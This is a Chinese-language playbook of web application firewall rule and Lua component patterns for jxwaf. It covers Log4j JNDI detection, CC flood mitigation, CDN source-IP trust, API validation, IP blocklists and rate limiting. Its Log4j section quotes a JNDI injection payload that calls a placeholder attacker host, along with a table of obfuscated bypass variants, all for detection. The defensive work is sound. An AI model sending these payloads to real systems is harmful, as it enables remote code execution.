# 实战防护方案库（已验证模式）

> 可直接复用的配置模式。所有 JSON 为 `generate --params` 入参格式，拦截类按红线默认 watch，验证无误报后改 block。字段规范见 [rule_dev.md](rule_dev.md) / [module_dev.md](module_dev.md)。

## 1. Log4j JNDI 注入（CVE-2021-44228，4 条规则分层防御）

**攻击特征**：利用 `${...}` 查找语法触发 JNDI 协议请求（RCE）。典型 `${jndi:ldap://attacker.com/a}`，大量混淆变体。

**分层策略**：基础协议检测 → 混淆前缀检测 → 嵌套兜底 → POST Body 补充。单条规则内多个 match_args 为 **OR**（request_uri / raw_header / cookie 任一命中即拦截）。

```
# 规则 1：基础 JNDI 注入 + 直接协议串
jxwaf-cli generate web-rule --params '{
  "config": {
    "rule_name": "block_log4j_jndi_injection",
    "rule_detail": "Log4j JNDI注入基础检测",
    "rule_matchs": [{
      "match_args": [
        {"key": "http_args", "value": "request_uri"},
        {"key": "http_args", "value": "raw_header"},
        {"key": "http_args", "value": "cookie"}
      ],
      "args_prepocess": ["none"],
      "match_operator": "rx",
      "match_value": "\\$\\{[^}]*jndi:|jndi:(ldap|rmi|dns|ldaps|iiop|corba|nis|http)://"
    }],
    "rule_action": "watch"
  }
}'
```

```
# 规则 2：混淆技术前缀（lower/upper/env/sys 前缀 与 ${::- 空默认值）
match_value: "\\$\\{(lower|upper|env|sys|date|java):|\\$\\{::-"
（match_args 同规则 1）

# 规则 3：嵌套查找兜底（覆盖所有嵌套混淆变体）
match_value: "\\$\\{\\$\\{"
（match_args 同规则 1）

# 规则 4：POST Body 注入（单独规则，raw_body 为文件型 body 时返回 nil 需注意）
match_args: [{"key": "http_args", "value": "raw_body"}]
match_value: 同规则 1
```

**绕过对抗对照**：

| 绕过类别 | Payload 示例 | 对抗规则 |
|---|---|---|
| 大小写混淆 | `${${lower:j}ndi:}` | 规则 2（lower/upper 前缀） |
| 空字符串默认值 | `${${::-j}${::-n}...}` | 规则 2（`${::-`） |
| 环境变量默认值 | `${${env:BARFOO:-j}ndi:}` | 规则 2（env: 前缀） |
| 系统属性默认值 | `${${sys:user.dir:-j}ndi:}` | 规则 2（sys: 前缀） |
| 嵌套查找 | `${${lower:${lower:j}}ndi:}` | 规则 3（`${${`） |
| URL 编码 | `%24%7Bjndi:...` | match_args 加 `uri_args` + `uriDecode` 预处理 |
| POST Body | `{"user":"${jndi:...}"}` | 规则 4 |

## 2. CC 攻击防护（组件方案 cc_attack_detect）

**检测逻辑**：每接口 × 每 IP 固定窗口计数 → 单 IP 超阈值记为高频 → 接口高频 IP 数超阈值判定 CC → 接口级开启人机识别持续 protect_time。

**组件 code**（遵守 module_dev.md 全部红线：require 置顶、incr 固定窗口、add 原子判重、waf_log 前置、fail-safe）：

```lua
local request = require "resty.jxwaf.request"
local unify_action = require "resty.jxwaf.unify_action"

local _M = {}

function _M.check(conf_data)
    local stat_time = 60
    local ip_request_threshold = 100
    local high_freq_ip_threshold = 1000
    local protect_time = 600
    local bot_check_type = "auto"
    if conf_data then
        stat_time = tonumber(conf_data["stat_time"]) or stat_time
        ip_request_threshold = tonumber(conf_data["ip_request_threshold"]) or ip_request_threshold
        high_freq_ip_threshold = tonumber(conf_data["high_freq_ip_threshold"]) or high_freq_ip_threshold
        protect_time = tonumber(conf_data["protect_time"]) or protect_time
        if type(conf_data["bot_check_type"]) == "string" and conf_data["bot_check_type"] ~= "" then
            bot_check_type = conf_data["bot_check_type"]
        end
    end

    local dict = ngx.shared.jxwaf_user
    local path = ngx.var.uri
    local src_ip = request.get_args("http_args", "src_ip")
    local block_key = "cc_attack_defense|block|" .. path

    -- 防护期内：统一人机识别（bot_check 通过者 Cookie 86400 秒免疫）
    if dict:get(block_key) then
        ngx.ctx.waf_log = {
            waf_module = "base_component",
            waf_policy = "防护组件-cc_attack_detect",
            waf_action = "bot_check",
            waf_extra = "cc_attack_active path=" .. path,
        }
        unify_action.bot_commit_auth()
        unify_action.bot_check_ip(bot_check_type)
        return
    end

    -- 每 IP × 接口 固定窗口计数（incr 的 init+ttl 即固定窗口，勿再 expire 刷新）
    local count = dict:incr("cc_attack_defense|count|" .. src_ip .. "|" .. path, 1, 0, stat_time)
    if not count or count <= ip_request_threshold then
        return
    end

    -- 首次进入高频的 IP 才计入接口高频数（add 原子判重）
    local first_marked = dict:add("cc_attack_defense|marked|" .. path .. "|" .. src_ip, "1", stat_time)
    if not first_marked then
        return
    end
    local hf_count = dict:incr("cc_attack_defense|high_freq|" .. path, 1, 0, stat_time)
    if not hf_count or hf_count < high_freq_ip_threshold then
        return
    end

    -- 判定 CC 攻击：接口级开启人机识别（add 原子，仅首个触发者写入）
    dict:add(block_key, "1", protect_time)
    ngx.ctx.waf_log = {
        waf_module = "base_component",
        waf_policy = "防护组件-cc_attack_detect",
        waf_action = "bot_check",
        waf_extra = "cc_attack_triggered path=" .. path .. " high_freq_ip=" .. tostring(hf_count),
    }
    unify_action.bot_commit_auth()
    unify_action.bot_check_ip(bot_check_type)
end

return _M
```

**conf 配置**：

```json
{"stat_time": 60, "ip_request_threshold": 100, "high_freq_ip_threshold": 1000, "protect_time": 600, "bot_check_type": "auto"}
```

## 3. CDN 源 IP 提取（组件方案 cdn_src_ip_extract）

**场景**：流量经 CDN 回源，需从指定头取真实客户端 IP，且**仅当来源 IP 命中可信 CDN 网段**才信任该头（防伪造绕过 IP 防护）。

**组件 code**：

```lua
local request = require "resty.jxwaf.request"
local iputils = require "resty.jxwaf.iputils"

local _M = {}

function _M.check(conf_data)
    if type(conf_data) ~= "table" then
        return
    end
    local cidrs = conf_data["cdn_whitelist_cidrs"]
    if type(cidrs) ~= "table" then
        return
    end

    -- 纯 IP 补 /32，拼为逗号分隔串
    local list = {}
    for _, c in ipairs(cidrs) do
        if type(c) == "string" and c ~= "" then
            if not string.find(c, "/", 1, true) then
                c = c .. "/32"
            end
            table.insert(list, c)
        end
    end
    if #list == 0 then
        return
    end

    local src_ip = request.get_args("http_args", "src_ip")
    if not src_ip then
        return
    end
    -- 仅 CDN 网段来源才信任真实 IP 头（禁止自行实现 CIDR 判断，用内置 iputils）
    if not iputils.ip_in_cidrs(src_ip, table.concat(list, ",")) then
        return
    end
    local real_ip = ngx.var.http_cdn_src_ip
    if real_ip and real_ip ~= "" then
        ngx.ctx.src_ip = real_ip  -- 后续所有模块 http_args:src_ip 取到真实客户端 IP
    end
end

return _M
```

**conf 配置**：`{"cdn_whitelist_cidrs": ["8.134.210.0/24", "61.174.128.69"]}`

## 4. API 参数校验（组件 + 规则联合方案）

**模式**：组件负责检测（复杂逻辑），设 `ngx.ctx` 标记；规则引用 `ctx_args` 决定处置（可观察/拦截，改动作不动代码）。

**组件 code**（check_api_id_valid）：

```lua
local request = require "resty.jxwaf.request"

local _M = {}

function _M.check(conf_data)
    local path = ngx.var.uri
    local method = request.get_args("http_args", "method")
    if method ~= "GET" or path ~= "/api/test" then
        return
    end
    local id = request.get_args("uri_args", "id")
    -- id 必须存在且为纯数字
    if type(id) ~= "string" or id == "" or not id:match("^%d+$") then
        ngx.ctx.api_id_invalid = true
    end
end

return _M
```

**联动规则**（block_api_id_invalid）：

```json
{
  "config": {
    "rule_name": "block_api_id_invalid",
    "rule_detail": "API id参数非法",
    "rule_matchs": [{
      "match_args": [{"key": "ctx_args", "value": "api_id_invalid"}],
      "args_prepocess": ["none"],
      "match_operator": "status_check",
      "match_value": "exist"
    }],
    "rule_action": "watch"
  }
}
```

## 5. IP 黑名单快速封禁（名单方案）

名单执行先于所有规则、纯哈希查找，适合高频封禁查询。临时封禁必须带过期：

```
jxwaf-cli generate name-list --params '{
  "config": {
    "name_list_name": "block_malicious_ip",
    "name_list_detail": "恶意IP临时封禁",
    "name_list_rule": [{"key": "http_args", "value": "src_ip"}],
    "name_list_action": "block",
    "action_value": "",
    "name_list_expire": "true",
    "name_list_expire_time": "3600"
  }
}'
```

动态加/删条目（幂等，已存在仅刷新过期时间；可对接 SOC 告警自动化）：

```
jxwaf-cli namelist item-add --params '{"name_list_name":"block_malicious_ip","name_list_item":"1.2.3.4"}' --apply
jxwaf-cli namelist item-del --params '{"name_list_name":"block_malicious_ip","name_list_item":"1.2.3.4"}' --apply
```

## 6. 接口限速（流量规则方案）

**要点**：entity 用 src_ip + path 双维度（不同接口互不影响）；`exceed_count` 严格大于（100=第 101 次触发）；bot_check(auto) 对正常用户无感。

```json
{
  "config": {
    "rule_name": "limit_api_rate",
    "rule_detail": "API接口限速",
    "rule_matchs": [{
      "match_args": [{"key": "http_args", "value": "path"}],
      "args_prepocess": ["none"],
      "match_operator": "str_prefix",
      "match_value": "/api/"
    }],
    "rule_action": "bot_check",
    "action_value": "auto",
    "filter": "true",
    "entity": [{"key": "http_args", "value": "src_ip"}, {"key": "http_args", "value": "path"}],
    "stat_time": 60,
    "exceed_count": 100,
    "block_time": 300
  },
  "test_cases": [
    {"name": "正常请求", "method": "GET", "path": "/api/user", "expect": "pass"},
    {"name": "高频请求", "method": "GET", "path": "/api/user", "expect": "block"}
  ]
}
```

## 案例复用注意

1. 所有拦截类先 `watch` 下发 → `test verify` 验证 → 无误报改 block 再下发生产
2. 组件案例下发前确认：conf 字段类型（数值 tonumber）、key 前缀已拼项目名、TTL 全覆盖
3. 阈值类参数（exceed_count / threshold）按业务峰值调整，参考 [playbook.md](playbook.md) PV 限速建议表
